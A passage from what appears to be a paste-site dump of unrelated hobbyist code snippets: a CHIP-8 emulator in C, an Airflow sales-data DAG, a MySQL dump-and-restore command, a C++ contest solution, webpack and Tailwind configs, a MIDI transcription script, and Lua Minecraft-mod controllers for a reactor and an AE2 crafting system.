                     {0xF0, 0x80, 0xF0, 0x80, 0xF0},  // E
                     {0xF0, 0x80, 0xF0, 0x80, 0x80}}; // F

typedef struct {
    // DXYN, 0XNN, 1NNN
    uint8_t head;   /* First nibble in opcode */
    uint8_t X;      /* Second nibble in opcode */
    uint8_t Y;      /* Third nibble in opcode */
    uint8_t N;      /* Fourth nibble in opcode */
    uint8_t NN;     /* Third to forth byte in opcode */
    uint16_t NNN;   /* Second to forht 12 bit in opcode */
    uint16_t bytes; /* The whole opcode */
} opcode;

void print_bytes(const void *ptr, size_t size) {
    const unsigned char *p = ptr;
    for (size_t i = 0; i < size; i++) {
        printf(""%02hhx"", p[i]);
        if ((i + 1) % 2 == 0) {
            printf("" ""); // Add extra space every 2 bytes for formatting
        }
        if ((i + 1) % 16 == 0) {
            printf(""\n""); // Start a new line every 16 bytes for formatting
        }
    }
    printf(""\n"");
}

void pirnt_opcode(opcode op) {
    printf(""Opcode: %x\n""
           ""Head: %x\n""
           ""X: %x\n""
           ""Y: %x\n""
           ""N: %x\n""
           ""NN: %x\n""
           ""NNN: %x\n"",
           op.bytes, op.head, op.X, op.Y, op.N, op.NN, op.NNN);
}

bool valid_file(char *file) {
    FILE *f = fopen(file, ""r"");
    if (f == NULL) {
        perror(""fopen"");
        fclose(f);
        return false;
    }

    fclose(f);
    return true;
}

int read_rom_file(char *file, uint8_t **dest, uint16_t *size) {
    FILE *f = fopen(file, ""rb"");
    if (!f) {
        perror(""fopen"");
        return EXIT_FAILURE;
    }

    fseek(f, 0, SEEK_END);
    *size = ftell(f);
    fseek(f, 0, SEEK_SET);

    *dest = malloc(*size);
    if (*dest == NULL) {
        perror(""malloc"");
        fclose(f);
        return EXIT_FAILURE;
    }

    // Read the file's bytes into the buffer
    size_t bytes_read = fread((*dest) + MEM_OFFSET, 1, *size, f);
    if (bytes_read != *size) {
        fprintf(stderr, ""error: %zu != %d\n"", bytes_read, *size);
        perror(""fread"");
        fclose(f);
        return EXIT_FAILURE;
    }

    fclose(f);
    return EXIT_SUCCESS;
}

void free_chip8(struct chip8 *ch8) {
    free(ch8->mem);
    free(ch8);
}

chip8 *init_chip8(char *rom_file) {
    struct chip8 *ch8 = malloc(sizeof(chip8));
    if (ch8 == NULL) {
        fprintf(stderr, ""Could not malloc sctruct chip8"");
        exit(1);
    }

    ch8->mem = malloc(MEM_SIZE);
    if (ch8->mem == NULL) {
        perror(""malloc"");
        exit(EXIT_FAILURE);
    }

    if (read_rom_file(rom_file, &ch8->mem, &ch8->rom_size) == EXIT_FAILURE) {
        free_chip8(ch8);
        exit(EXIT_FAILURE);
    }

    ch8->pc = MEM_OFFSET;
    ch8->deley_timer = 0;
    ch8->sound_timer = 0;

    return ch8;
}

opcode get_opcode(uint8_t *mem, uint16_t pc) {
    opcode op;
    op.bytes = (((uint16_t)mem[pc] << 8) | mem[pc + 1]);
    op.head = mem[pc] >> 4;
    op.X = mem[pc] & 0xf;
    op.Y = mem[pc + 1] >> 4;
    op.N = mem[pc + 1] & 0xf;
    op.NN = mem[pc + 1];
    uint16_t mask = 0x0fff;
    op.NNN = op.bytes & mask;
    return op;
}

void chip8_draw_sprite(struct chip8 *ch8) {
    assert(false && ""TODO: needs to be implemented"");
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, ""Wrong number of arugnemtns: ./main <rom.ch8>\n"");
        return 1;
    }
    char *rom_file = argv[1];

    if (!valid_file(rom_file)) {
        fprintf(stderr, ""Wrong file was given: %s\n"", rom_file);
        return 1;
    }

    chip8 *ch8 = init_chip8(rom_file);

    printf(""loading file: %s\n"", rom_file);
    print_bytes(ch8->mem + MEM_OFFSET, ch8->rom_size);

    // Start raylib
    SetTraceLogLevel(LOG_WARNING);
    InitWindow(SCREEN_WIDTH, SCREEN_HEIGHT, ""CHIP 8 Emulation"");

    printf(""\nAfter calling `InitWindow()`:\n"");
    print_bytes(ch8->mem + MEM_OFFSET, ch8->rom_size);

    free_chip8(ch8);
    return 0;
}
"
XkMU8BBj,Untitled,Alex88888,Python,Wednesday 28th of June 2023 04:44:02 PM CDT,"import time
import requests
import json
import pandas as pd
 
from datetime import datetime, timedelta
from airflow import DAG
from airflow.operators.python import PythonOperator, BranchPythonOperator
from airflow.providers.postgres.operators.postgres import PostgresOperator
from airflow.providers.postgres.hooks.postgres import PostgresHook
from airflow.providers.http.hooks.http import HttpHook
 
# инициализация подключения
http_conn_id = HttpHook.get_connection('http_conn_id')
api_key = http_conn_id.extra_dejson.get('api_key')
base_url = http_conn_id.host
 
postgres_conn_id = 'postgresql_de'
 
nickname = 'agiwago'
cohort = '15'
 
headers = {
    'X-Nickname': nickname,
    'X-Cohort': cohort,
    'X-Project': 'True',
    'X-API-KEY': api_key,
    'Content-Type': 'application/x-www-form-urlencoded'
}
 
# request generate_report
def generate_report(ti):
    print('Making request generate_report')
 
    response = requests.post(f'{base_url}/generate_report', headers=headers)
    response.raise_for_status()
    task_id = json.loads(response.content)['task_id']
    ti.xcom_push(key='task_id', value=task_id)
    print(f'Response is {response.content}')
 
 
# request get_report
def get_report(ti):
    print('Making request get_report')
    task_id = ti.xcom_pull(key='task_id')
 
    report_id = None
 
    for i in range(20):
        response = requests.get(f'{base_url}/get_report?task_id={task_id}', headers=headers)
        response.raise_for_status()
        print(f'Response is {response.content}')
        status = json.loads(response.content)['status']
        if status == 'SUCCESS':
            report_id = json.loads(response.content)['data']['report_id']
            break
        else:
            time.sleep(10)
 
    if not report_id:
        raise TimeoutError()
 
    ti.xcom_push(key='report_id', value=report_id)
    print(f'Report_id={report_id}')
 
 
# request get_increment
def get_increment(date, ti):
    print('Making request get_increment')
    report_id = ti.xcom_pull(key='report_id')
    response = requests.get(
        f'{base_url}/get_increment?report_id={report_id}&date={str(date)}T00:00:00',
        headers=headers)
    response.raise_for_status()
    print(f'Response is {response.content}')
 
    increment_id = json.loads(response.content)['data']['increment_id']
    if not increment_id:
        raise ValueError(f'Increment is empty. Most probably due to error in API call.')
 
    ti.xcom_push(key='increment_id', value=increment_id)
    print(f'increment_id={increment_id}')
 
 
# загрузка в staging
def upload_data_to_staging(filename, date, pg_table, pg_schema, ti):
    increment_id = ti.xcom_pull(key='increment_id')
    s3_filename = f'https://storage.yandexcloud.net/s3-sprint3/cohort_{cohort}/{nickname}/project/{increment_id}/{filename}'
    print(s3_filename)
    local_filename = date.replace('-', '') + '_' + filename
    print(local_filename)
    response = requests.get(s3_filename)
    response.raise_for_status()
    open(f""{local_filename}"", ""wb"").write(response.content)
    print(response.content)
 
    df = pd.read_csv(local_filename)
    df=df.drop('id', axis=1)
    df=df.drop_duplicates(subset=['uniq_id'])
 
    if 'status' not in df.columns:
        df['status'] = 'shipped'
 
    postgres_hook = PostgresHook(postgres_conn_id)
    engine = postgres_hook.get_sqlalchemy_engine()
    row_count = df.to_sql(pg_table, engine, schema=pg_schema, if_exists='append', index=False)
    print(f'{row_count} rows was inserted')
 
args = {
    ""owner"": ""student"",
    'email': ['student@example.com'],
    'email_on_failure': False,
    'email_on_retry': False,
    'retries': 0
}
 
business_dt = '{{ ds }}'
 
with DAG(
        'sales_mart',
        default_args=args,
        description='Provide default dag for sprint3',
        catchup=True,
        start_date=datetime.today() - timedelta(days=7),
        end_date=datetime.today() - timedelta(days=1),
) as dag:
    generate_report = PythonOperator(
        task_id='generate_report',
        python_callable=generate_report)
 
    get_report = PythonOperator(
        task_id='get_report',
        python_callable=get_report)
 
    get_increment = PythonOperator(
        task_id='get_increment',
        python_callable=get_increment,
        op_kwargs={'date': business_dt})
 
    upload_user_order_inc = PythonOperator(
        task_id='upload_user_order_inc',
        python_callable=upload_data_to_staging,
        op_kwargs={'date': business_dt,
                   'filename': 'user_order_log_inc.csv',
                   'pg_table': 'user_order_log',
                   'pg_schema': 'staging'})
 
    update_d_item_table = PostgresOperator(
        task_id='update_d_item',
        postgres_conn_id=postgres_conn_id,
        sql=""sql/mart.d_item.sql"")
 
    update_d_customer_table = PostgresOperator(
        task_id='update_d_customer',
        postgres_conn_id=postgres_conn_id,
        sql=""sql/mart.d_customer.sql"")
 
    update_d_city_table = PostgresOperator(
        task_id='update_d_city',
        postgres_conn_id=postgres_conn_id,
        sql=""sql/mart.d_city.sql"")
 
    update_f_sales = PostgresOperator(
        task_id='update_f_sales',
        postgres_conn_id=postgres_conn_id,
        sql=""sql/mart.f_sales.sql"",
        parameters={""date"": {business_dt}}
    )
 
    (
            generate_report
            >> get_report
            >> get_increment
            >> upload_user_order_inc
            >> [update_d_item_table, update_d_city_table, update_d_customer_table]
            >> update_f_sales
    )"
YnL3gGU3,Дамп Базы из одной базы в другую в терминале,Sadchenko,Pascal,Wednesday 28th of June 2023 04:26:18 PM CDT,"//Дамп Базы из одной базы в другую в терминале
mysqldump myshop_proriv > myshop_proriv.sql
mysql myshop_prorivtest < myshop_proriv.sql"
WRW53ftn,Railguns,ThegeekKnight16,C++,Wednesday 28th of June 2023 04:05:31 PM CDT,"#include <bits/stdc++.h>
using namespace std;
//Mudar para submeter
const int MAXN = 1e3 + 10;
const int MAXSZ = 10;
const int INF = 0x3f3f3f3f;
array<array<set<int>, MAXN>, MAXN> Chegam;
array<set<int>, MAXN> lin, col;

void updateChegam(int start, int x, int y, set<int> &resp)
{
    int limLin = *lin[x].lower_bound(start);
    int limCol = *col[y].lower_bound(start);
    for (int i = start; i <= min(limLin,limCol) && resp.size() <= MAXSZ; i++) resp.insert(i);
}

void solve()
{
    int N, M;
    cin >> N >> M;
    int R;
    cin >> R;
    for (int i = 0; i < R; i++)
    {
        int T, dir, X;
        cin >> T >> dir >> X;
        if (dir == 1) lin[X].insert(T);
        else if (dir == 2) col[X].insert(T);
    }
    for (int i = 0; i <= N; i++) lin[i].insert(INF);
    for (int i = 0; i <= M; i++) col[i].insert(INF);

    updateChegam(0, 0, 0, Chegam[0][0]);

    // cerr << ""||"" << 0 << "" "" << 0 << '\n' << ""|||"";
    // for (auto x : Chegam[0][0]) cerr << x << "" "";
    // cerr << '\n';

    for (int i = 0; i <= N; i++)
    {
        for (int j = 0; j <= M; j++)
        {
            if (i == 0 && j == 0) continue;
            auto &resp = Chegam[i][j];
            if (i != 0)
            {
                auto &cheg = Chegam[i-1][j];
                for (auto x : cheg) resp.insert(x+1);
            }
            if (j != 0)
            {
                auto &cheg = Chegam[i][j-1];
                for (auto x : cheg) resp.insert(x+1);
            }
            for (auto x : lin[i]) resp.erase(x);
            for (auto x : col[j]) resp.erase(x);
            if (!resp.empty()) updateChegam(*resp.rbegin(), i, j, resp);
            // cerr << ""||"" << i << "" "" << j << '\n' << ""||"";
            // for (auto x : resp) cerr << x << "" "";
            // cerr << '\n';
        }
    }

    if (Chegam[N][M].empty()) {cout << ""-1"" << '\n'; return;}

    cout << *Chegam[N][M].begin() << '\n';
}

int main()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    int T;
    cin >> T;
    while (T--) solve();
}
"
LZVPxcnS,configWebPackTailwind,FabioMurtas,JavaScript,Wednesday 28th of June 2023 04:01:27 PM CDT,"//config webPack

const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const CopyWebpackPlugin = require('copy-webpack-plugin');

module.exports = {
  entry: {
    index: './src/index.js',
    registrazione: './src/registrazione.js',
    creaSegnalazione: './src/creaSegnalazione.js'
  },
  output: {
    path: path.resolve(__dirname, 'dist'),
    filename: '[name].bundle.js',
    clean: true
  },
  module: {
    rules: [
      // ... altre regole ...
      {
        test: /\.css$/,
        use: [
          'style-loader',
          'css-loader',
          {
            loader: 'postcss-loader',
            options: {
              postcssOptions: {
                plugins: [
                  require('tailwindcss'),
                  // Altri plugin PostCSS se necessario
                ],
                minimize: true // Abilita la minificazione CSS
              }
            }
          }
        ],
      },
    ],
  },
  plugins: [
    new CopyWebpackPlugin({
      patterns: [
        { from: 'src/css', to: 'css' }, // Copia tutti i file dalla cartella ""src/css"" alla cartella ""dist/css""
      ],
    }),
    new HtmlWebpackPlugin({
      template: './src/index.html',
      chunks: ['index'],
      filename: 'index.html'
    }),
    new HtmlWebpackPlugin({
        template: './src/registrazione.html',
        chunks: ['registrazione'],
        filename: 'registrazione.html'
      }),
      
    new HtmlWebpackPlugin({
      template: './src/homeSegnalatore.html',
      chunks: ['homeSegnalatore'],
      filename: 'homeSegnalatore.html'
    }),
    new HtmlWebpackPlugin({
      template: './src/creaSegnalazione.html',
      chunks: ['creaSegnalazione'],
      filename: 'creaSegnalazione.html'
    })
  ],
  devServer: {
    static: {
      directory: path.resolve(__dirname, 'dist'),
    },
    port: 3000,
    open: true,
    hot: true,
    compress: true,
    historyApiFallback: true
  },
  mode: 'development',
  devtool: 'source-map'
};


//config tailwind
/** @type {import('tailwindcss').Config} */
module.exports = {
  content: ['./dist/*.html'],
  theme: {
    extend: {},
  },
  plugins: [],
}


//postcss config
const tailwindcss = require('tailwindcss');
module.exports = {
  plugins: [
    require(""tailwindcss"")(""./tailwind.config.js""),
    require(""autoprefixer"")
  ],
};

//packagejson

{
  ""name"": ""sdsapp"",
  ""version"": ""1.0.0"",
  ""description"": """",
  ""main"": ""index.js"",
  ""scripts"": {
    ""build"": ""webpack --mode production"",
    ""watch"": ""webpack --mode development --watch"",
    ""start"": ""webpack serve""
  },
  ""keywords"": [],
  ""author"": """",
  ""license"": ""ISC"",
  ""devDependencies"": {
    ""@firebase/analytics"": ""^0.10.0"",
    ""@firebase/app"": ""^0.9.13"",
    ""autoprefixer"": ""^10.4.14"",
    ""copy-webpack-plugin"": ""^11.0.0"",
    ""css-loader"": ""^6.8.1"",
    ""html-webpack-plugin"": ""^5.5.3"",
    ""postcss"": ""^8.4.24"",
    ""postcss-loader"": ""^7.3.3"",
    ""style-loader"": ""^3.3.3"",
    ""tailwindcss"": ""^3.3.2"",
    ""webpack"": ""^5.88.0"",
    ""webpack-cli"": ""^5.1.4"",
    ""webpack-dev-server"": ""^4.15.1""
  },
  ""dependencies"": {
    ""body-parser"": ""^1.20.2"",
    ""express"": ""^4.18.2"",
    ""firebase"": ""^9.23.0"",
    ""mysql"": ""^2.18.1""
  }
}


// boil 
---dist
---node_modules
---src
  ---backend
  ---css
    ---style.css
  ---(...file js e html vari)
  ---input.css
---gitignore
---package-lock.json
---package.json
---postcss.config.js
---tailwind.js
---webpack.config.js
"
a83ec6wQ,to_midi.py,JakimPL,Python,Wednesday 28th of June 2023 03:58:22 PM CDT,"import numpy as np
import pandas as pd

import mido
import pretty_midi as pm
import music21 as m21

from pm2s.features.hand_part import RNNHandPartProcessor
from pm2s.features.time_signature import RNNTimeSignatureProcessor
from pm2s.features.key_signature import RNNKeySignatureProcessor
from pm2s.features.beat import RNNJointBeatProcessor
from pm2s.features.quantisation import RNNJointQuantisationProcessor
from dev.data.data_utils import get_note_sequence_from_midi

note_sequence = get_note_sequence_from_midi(midi_path)
b_pred = b_processor.process(midi_path)
q_pred = q_processor.process(midi_path)
hp_pred = hp_processor.process(midi_path)
ts_pred = ts_processor.process(midi_path)
ks_pred = ks_processor.process(midi_path)

score = m21.stream.Score()
left_hand = m21.stream.Stream()
right_hand = m21.stream.Stream()

for key_signature in ks_pred:
    offset, ks = key_signature
    position = np.argmax(offset < q_pred[0])
    ks_obj = m21.key.Key(ks)
    score.insert(position, ks_obj)
    
for ts_change in ts_pred:
    offset, ts = ts_change
    position = np.argmax(offset < q_pred[0])
    ts_obj = m21.meter.TimeSignature(ts)
    score.insert(position, ts_obj)
    print(offset, ts, position)
    
# for i in range(len(q_pred[0]) - 1):
#     diff = q_pred[0][i + 1] - q_pred[0][i]
#     print(diff)
#     metronome = m21.tempo.MetronomeMark(number=60 / diff)
#     #print(metronome)
#     score.insert(i, metronome)

for index, note in enumerate(note_sequence):
    duration = q_pred[2][index]
    offset = q_pred[1][index]
    midi_note = m21.note.Note(int(note[0]))
    midi_note.quarterLength = duration
    midi_note.volume = note[3]
    midi_note.offset = offset
    print(midi_note, q_pred[1][index], q_pred[2][index])
    if hp_pred[index]:
        left_hand.append(midi_note)
        left_hand.setElementOffset(midi_note, offset)
    else:
        right_hand.append(midi_note)
        right_hand.setElementOffset(midi_note, offset)
    
score.insert(0, left_hand)
score.insert(0, right_hand)

score.write('midi', fp='output.midi')"
p45sdx1e,ic2reactor.lua,Nikit_OS,Lua,Wednesday 28th of June 2023 03:54:15 PM CDT,"local version=""8.0""

local component = require(""component"")
local computer = require(""computer"")
local event = require(""event"")
local term = require(""term"")
local fs = require(""filesystem"")
local sides = require(""sides"")
local rs = component.redstone
local gpu = component.gpu
local beep = component.computer.beep
local reactor=component.reactor_chamber

--reactor
Heat=reactor.getMaxHeat
getHeat=reactor.getHeat 
EUOutput=reactor.getReactorEUOutput 
--reactor

--colors
local black = 0x000000
local red = 0xFF0000
local yellow = 0xFFFF00
local white = 0xffffff
--colors

local start_time = computer.uptime()

--local modem = component.modem

local w,h = gpu.getResolution()

--maxResolution() 160x50 if 3x2blocks w,h

-- place for config

--Bottom: down, negy
--Top: up, posy
--Back: north, negz
--Front: south, posz, forward
--Right: west, negx
--Left: east, posx
local side = sides.west


-------------------
-- end of config


--start_time

--timer
local tickCnt = 0
local running = true
local hours = 0
local mins = 0
--timer

local function centerF(row, msg, ...)
  local mLen = string.len(msg)
  w, h = gpu.getResolution()
  term.setCursor((w - mLen)/2,row)
  print(msg:format(...))
end

--more functions
local function status()
  if EUOutput() == 0 then 
  return ""offline"" 
  else
  return ""online ""
  end
end 

local function enable()
  return rs.setOutput(side,14)
  end
local function disable()
 return rs.setOutput(side,0)
  end

local function maxheat()
  return reactor.getMaxHeat()
  end
  
local function getheat()
  if getHeat() == 0 then
        enable()
  return ""0   ""
  else
        disable()
  return reactor.getHeat()
  end
end
  
local function getEU()
  if EUOutput() == 0 then
  return ""0   ""
  else
  return reactor.getReactorEUOutput()
  end
end
--more functions  

gpu.setForeground(0xffffff)


-----
term.clear()
term.setCursor(1,1)

centerF(5,  ""-----------------------------------------"")
centerF(6,  ""-       IC2 Reactor Controller V4       -"")
centerF(7,  ""-----------------------------------------"")
centerF(8, string.format(""- Reactor is:             %s       -"",status())) 
centerF(9, string.format(""- Reactor maxheat:        %s         -"",maxheat())) 
centerF(10, string.format(""- Reactor heat:           %s          -"",  getheat())) 
centerF(11, string.format(""- Reactor EU Output:      %s          -"",  getEU())) 
centerF(12, ""-----------------------------------------"")
centerF(13, ""-                                       -"")   
centerF(14, ""-----------------------------------------"")
  
while true do 

  
  tickCnt = tickCnt + 1
  if tickCnt == 60 then
    mins = mins + 1
    tickCnt = 0
  end
  
  if mins == 60 then
    hours = hours + 1
    mins = 0
  end

  os.sleep(1)
  
  centerF(8, string.format(""- Reactor is:             %s       -"",status())) 
  centerF(9, string.format(""- Reactor maxheat:        %s         -"",maxheat())) 
  centerF(10, string.format(""- Reactor heat:           %s          -"",  getheat())) 
  centerF(11, string.format(""- Reactor EU Output:      %s          -"",  getEU())) 
  centerF(30, ""Data updates every second: %2d"", tickCnt)
  centerF(31, ""Current up time: %2d hours %2d min"", hours, mins)
end"
LsK7AeXm,ae2-manager,STEP5,Lua,Wednesday 28th of June 2023 03:30:23 PM CDT,"--
-- Copyright 2019 KaseiFR <kaseifr@gmail.com>
--
-- Permission is hereby granted, free of charge, to any person obtaining a copy
-- of this software and associated documentation files (the ""Software""), to deal
-- in the Software without restriction, including without limitation the rights
-- to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-- copies of the Software, and to permit persons to whom the Software is
-- furnished to do so, subject to the following conditions:
--
-- The above copyright notice and this permission notice shall be included in all
-- copies or substantial portions of the Software.
--
-- THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-- IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-- FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-- AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-- LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-- OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-- SOFTWARE.
--

local component = require('component')
local computer = require('computer')
local coroutine = require('coroutine')
local event = require('event')
local filesystem = require('filesystem')
local serialization = require('serialization')
local thread = require('thread')
local tty = require('tty')
local unicode = require('unicode')
local GUI = require('GUI')
-- local inspect = require('inspect')

-- Config --

-- Control how many CPUs to use. 0 is unlimited, negative to keep some CPU free, between 0 and 1 to reserve a share,
-- and greater than 1 to allocate a fixed number.
local allowedCpus = 2
-- Maximum size of the crafting requests
local maxBatch = 64
-- How often to check the AE system, in second
local fullCheckInterval = 10        -- full scan
local craftingCheckInterval = 1     -- only check ongoing crafting
-- Where to save the config
local configPath = '/home/ae2-manager.cfg'

-- Global State --

-- array of recipe like { item, label, wanted, [current, crafting] }
local recipes = {}
-- various system status data
local status = {}
-- AE2 proxy
local ae2

-- Functions --

function main()
    local resetBColor, resetFColor = tty.gpu().getBackground(), tty.gpu().getForeground()

    initAe2()
    loadRecipes()
    ae2Run(true)

    local app = buildGui()
    app:draw(true)

    -- Start some background tasks
    local background = {}
    table.insert(background, event.listen(""key_up"", function (key, address, char)
        if char == string.byte('q') then
            event.push('exit')
        end
    end))
    table.insert(background, event.listen(""redraw"", function (key) app:draw() end))
    table.insert(background, event.listen(""save"", failFast(saveRecipes)))
    table.insert(background, event.timer(craftingCheckInterval, failFast(checkCrafting), math.huge))
    table.insert(background, thread.create(failFast(ae2Loop)))
    table.insert(background, thread.create(failFast(function() app:start() end)))

    -- Block until we receive the exit signal
    local _, err = event.pull(""exit"")

    -- Cleanup
    app:stop()

    for _, b in ipairs(background) do
        if type(b) == 'table' and b.kill then
            b:kill()
        else
            event.cancel(b)
        end
    end

    tty.gpu().setBackground(resetBColor)
    tty.gpu().setForeground(resetFColor)
    tty.clear()

    if err then
        io.stderr:write(err)
        os.exit(1)
    else
        os.exit(0)
    end
end

function log(...)
    -- TODO: reserve a part of the screen for logs
    for i, v in ipairs{...} do
        if i > 1 then io.stderr:write(' ') end
        io.stderr:write(tostring(v))
    end
    io.stderr:write('\n')
end

function logRam(msg)
    free, total = computer.freeMemory(), computer.totalMemory()
    log(msg, 'RAM', (total - free) * 100 / total, '%')
end

function pretty(x)
    return serialization.serialize(x, true)
end

function failFast(fn)
    return function(...)
        local res = table.pack(xpcall(fn, debug.traceback, ...))
        if not res[1] then
            event.push('exit', res[2])
        end
        return table.unpack(res, 2)
    end
end

function initAe2()
    local function test_ae2(id)
        local proxy = component.proxy(id)
        proxy.getCpus()
        return proxy
    end

    for id, type in pairs(component.list()) do
        -- print('Testing ' .. type .. ' ' .. id)
        local ok, p = pcall(test_ae2, id)
        if ok then
            print('Component ' .. type .. ' (' .. id .. ') is suitable')
            ae2 = p
        end
    end

    if ae2 == nil then
        error('No AE2 component found')
    else
        print('Using component ' .. ae2.type .. ' (' .. ae2.address .. ')')
    end
end

function loadRecipes()
    print('Loading config from '..configPath)
    local f, err = io.open(configPath, 'r')
    if not f then
        -- usually the file does not exist, on the first run
        print('Loading failed:', err)
        return
    end

    local content = serialization.unserialize(f:read('a'))

    f:close()

    recipes = content.recipes
    print('Loaded '..#recipes..' recipes')
end

function saveRecipes()
    local tmpPath = configPath..'.tmp'
    local content = { recipes={} }

    for _, recipe in ipairs(recipes) do
        table.insert(content.recipes, {
            item = recipe.item,
            label = recipe.label,
            wanted = recipe.wanted,
        })
    end

    local f = io.open(tmpPath, 'w')
    f:write(serialization.serialize(content))
    f:close()

    filesystem.remove(configPath) -- may fail

    local ok, err = os.rename(tmpPath, configPath)
    if not ok then error(err) end
end

-- Main loop --

function ae2Loop()
    while true do
        local e1, e2 = event.pull(fullCheckInterval, 'ae2_loop')
        logRam('loop')
        --log('AE2 loop in')
        ae2Run(e2 == 'reload_recipes')
        --log('AE2 loop out')
        event.push('redraw')
    end
end


function ae2Run(learnNewRecipes)
    local start = computer.uptime()
    updateRecipes(learnNewRecipes)
    logRam('recipes')
    -- logRam('recipes (post-gc)')

    local finder = coroutine.create(findRecipeWork)
    while hasFreeCpu() do
        -- Find work
        local _, recipe, needed, craft = coroutine.resume(finder)
        if recipe then
            -- Request crafting
            local amount = math.min(needed, maxBatch)
            --log('Requesting ' .. amount .. ' ' .. recipe.label)
            recipe.crafting = craft.request(amount)
            yield('yield crafting')
            checkFuture(recipe) -- might fail very quickly (missing resource, ...)
        else
            break
        end
    end

    local duration = computer.uptime() - start
    updateStatus(duration)
end

function checkCrafting()
    for _, recipe in ipairs(recipes) do
        if checkFuture(recipe) then
            --log('checkCrafting event !')
            event.push('ae2_loop')
            return
        end
    end
end

function yield(msg)
    --local gpu = tty.gpu()
    --local _, h = gpu.getViewport()
    --gpu.set(1, h, msg)
    os.sleep()
end

function updateRecipes(learnNewRecipes)
    local start = computer.uptime()

    -- Index our recipes
    local index = {}
    for _, recipe in ipairs(recipes) do
        local key = itemKey(recipe.item, recipe.item.label ~= nil)
        index[key] = { recipe=recipe, matches={} }
    end
    --log('recipe index', computer.uptime() - start)

    -- Get all items in the network
    local items, err = ae2.getItemsInNetwork()  -- takes a full tick (to sync with the main thread?)
    if err then error(err) end
    --log('ae2.getItemsInNetwork', computer.uptime() - start, 'with', #items, 'items')

    -- Match all items with our recipes
    for _, item in ipairs(items) do
        local key = itemKey(item, item.hasTag)
        local indexed = index[key]
        if indexed then
            table.insert(indexed.matches, item)
        elseif learnNewRecipes and item.isCraftable then
            local recipe = {
                item = {
                    name = item.name,
                    damage = math.floor(item.damage)
                },
                label = item.label,
                wanted = 0,
            }
            if item.hasTag then
                -- By default, OC doesn't expose items NBT, so as a workaround we use the label as
                -- an additional discriminant. This is not perfect (still some collisions, and locale-dependent)
                recipe.item.label = recipe.label
            end
            table.insert(recipes, recipe)
            index[key] = { recipe=recipe, matches={item} }
        end
    end
    --log('group items', computer.uptime() - start)

    -- Check the recipes
    for _, entry in pairs(index) do
        local recipe = entry.recipe
        local matches = filter(entry.matches, function(e) return contains(e, recipe.item) end)
        --log(recipe.label, 'found', #matches, 'matches')
        local craftable = false
        recipe.error = nil

        checkFuture(recipe)

        if #matches == 0 then
            recipe.stored = 0
        elseif #matches == 1 then
            local item = matches[1]
            recipe.stored = math.floor(item.size)
            craftable = item.isCraftable
        else
            local id = recipe.item.name .. ':' .. recipe.item.damage
            recipe.stored = 0
            recipe.error = id .. ' match ' .. #matches .. ' items'
            -- log('Recipe', recipe.label, 'matches:', pretty(matches))
        end

        if not recipe.error and recipe.wanted > 0 and not craftable then
            -- Warn the user as soon as an item is not craftable rather than wait to try
            recipe.error = 'Not craftable'
        end
    end
    --log('recipes check', computer.uptime() - start)

    if learnNewRecipes then
        event.push('save')
    end
end

function itemKey(item, withLabel)
    local key = item.name .. '$' .. math.floor(item.damage)
    if withLabel then
        --log('using label for', item.label)
        key = key .. '$' .. item.label
    end
    return key
end

function updateStatus(duration)
    status.update = {
        duration = duration
    }

    -- CPU data
    local cpus = ae2.getCpus()
    status.cpu = {
        all = #cpus,
        free = 0,
    }
    for _, cpu in ipairs(cpus) do
        status.cpu.free = status.cpu.free + (cpu.busy and 0 or 1)
    end

    -- Recipe stats
    status.recipes = {
        error = 0,
        crafting = 0,
        queue = 0,
    }
    for _, recipe in ipairs(recipes) do
        if recipe.error then
            status.recipes.error = status.recipes.error + 1
        elseif recipe.crafting then
            status.recipes.crafting = status.recipes.crafting + 1
        elseif (recipe.stored or 0) < (recipe.wanted or 0) then
            status.recipes.queue = status.recipes.queue + 1
        end
    end
end

function checkFuture(recipe)
    if not recipe.crafting then return end

    local canceled, err = recipe.crafting.isCanceled()
    if canceled or err then
        --log('Crafting of ' .. recipe.label .. ' was cancelled')
        recipe.crafting = nil
        recipe.error = err or 'canceled'
        return true
    end

    local done, err = recipe.crafting.isDone()
    if err then error('isDone ' .. err) end
    if done then
        --log('Crafting of ' .. recipe.label .. ' is done')
        recipe.crafting = nil
        return true
    end

    return false
end

function equals(t1, t2)
    if t1 == t2 then return true end
    if type(t1) ~= type(t2) or type(t1) ~= 'table' then return false end

    for k1, v1 in pairs(t1) do
        local v2 = t2[k1]
        if not equals(v1, v2) then return false end
    end

    for k2, _ in pairs(t2) do
        if t1[k2] == nil then return false end
    end

    return true
end

function filter(array, predicate)
    local res = {}
    for _, v in ipairs(array) do
        if predicate(v) then table.insert(res, v) end
    end
    return res
end

function contains(haystack, needle)
    if haystack == needle then return true end
    if type(haystack) ~= type(needle) or type(haystack) ~= 'table' then return false end

    for k, v in pairs(needle) do
        if not contains(haystack[k], v) then return false end
    end

    return true
end

function hasFreeCpu()
    local cpus = ae2.getCpus()
    local free = 0
    for i, cpu in ipairs(cpus) do
        if not cpu.busy then free = free + 1 end
    end
    local ongoing = 0
    for _, recipe in ipairs(recipes) do
        if recipe.crafting then ongoing = ongoing + 1 end
    end

    if enoughCpus(#cpus, ongoing, free) then
        return true
    else
        --log('No CPU available')
        return false
    end
end

function enoughCpus(available, ongoing, free)
    if free == 0 then return false end
    if ongoing == 0 then return true end
    if allowedCpus == 0 then return true end
    if allowedCpus > 0 and allowedCpus < 1 then
        return  (ongoing + 1) / available <= allowedCpus
    end
    if allowedCpus >= 1 then
        return ongoing < allowedCpus
    end
    if allowedCpus > -1 then
        return (free - 1) / available <= -allowedCpus
    end
    return free > -allowedCpus
end

function findRecipeWork() --> yield (recipe, needed, craft)
    for i, recipe in ipairs(recipes) do
        if recipe.error or recipe.crafting then goto continue end

        local needed = recipe.wanted - recipe.stored
        if needed <= 0 then goto continue end

        yield('yield '..i)
        local craftables, err = ae2.getCraftables(recipe.item)
